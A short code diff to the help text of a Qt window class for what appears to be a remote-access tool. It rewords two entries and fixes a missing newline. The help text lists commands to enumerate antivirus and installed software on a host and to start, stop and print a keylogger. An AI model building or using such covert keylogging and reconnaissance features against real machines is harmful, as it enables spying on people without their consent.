@@ -1069,8 +1069,8 @@ class Ui_MainWindow2(object):
                              "-info                                Shows informations about host.\n",
                              "-fontsize <int>                      Sets the font size.\n",
                              "-history                             Shows the history of commands.\n",
-                             "-antivirus                           Lists the Antivirus installed on host (only windows)."
-                             "-softwares                           Lists the softwares installed on host.\n",
+                             "-antivirus                           Lists the installed Antivirus on host (only windows).\n"
+                             "-softwares                           Lists the installed softwares on host.\n",
                              "-keylogger start                     Start the keylogger function.\n",
                              "-keylogger stop                      Stop the keylogger function.\n",
                              "-keylogger print                     Shows the keylogger log.\n",
